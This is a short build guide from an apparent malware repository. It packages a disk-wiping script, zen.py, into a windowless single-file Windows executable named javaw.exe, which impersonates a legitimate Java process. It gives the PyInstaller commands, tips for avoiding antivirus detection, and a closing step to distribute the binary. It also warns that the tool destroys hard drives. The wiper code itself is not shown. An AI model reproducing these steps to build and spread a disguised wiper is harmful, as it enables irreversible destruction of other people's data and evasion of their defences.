# Build zen wipe into a exe for HDD hardrive only
# `zen.py` into `javaw.exe` with PyInstaller


Package `zen.py` into a single Windows executable named `javaw.exe` using PyInstaller. Clean machine, start to finish.

> Note: Do not run on a hdd it ruins hdd hard drives this for a poc only.

---

## 1) Prerequisites

### On Windows 10/11

1. Install Python (3.10+):

   * Download from python.org. During setup, check **“Add Python to PATH.”**
2. Install Git:


Verify:

```powershell
python --version
pip --version
git --version
```

---

## 2) Get the source

```
powershell
# choose a working folder
mkdir C:\work\zen && cd C:\work\zen

# if this repo already exists online, clone it:
git clone https://github.com/s-b-repo/ps1ware.git
cd HDD_wiperharder

```


---

## 3) Install build tooling and deps

```powershell
pip install pyinstaller
# optional if you add dependencies:
pip install -r requirements.txt
```

---


---

## 3) Build the executable

Basic single-file build with no console window:

```
powershell
pyinstaller --onefile --noconsole --name javaw zen.py
```

Output appears in:

```
dist\javaw.exe
```

### Optional flags

* Embed icon:

  ```
  powershell
  pyinstaller --onefile --noconsole --name javaw --icon path\to\icon.ico zen.py
  ```


## 4) Run the built app

```
powershell
.\dist\javaw.exe
```
---



## 5) Troubleshooting

* **`javaw.exe` starts but nothing happens**

  * Use `--windowed` only for GUI apps. For debugging, rebuild **without** `--noconsole` to see errors:

    ```powershell
    pyinstaller --onefile --name javaw zen.py
    .\dist\javaw.exe
    ```
* **Missing files at runtime**

  * Add them with `--add-data` and access via `import sys, os; base = getattr(sys, "_MEIPASS", os.getcwd())`.
* **`ModuleNotFoundError`**

  * Ensure the package is in `requirements.txt`, reinstall in the venv, rebuild.
* **Antivirus flags**

  * Avoid packers/obfuscators. Keep dependencies minimal. Sign binaries if possible.

---



---

## Summary

* Install Python and Git pip if not already installed.
* pip Install PyInstaller .
* Build with `pyinstaller --onefile --noconsole --name javaw zen.py`.
* Distribute `dist\javaw.exe`.
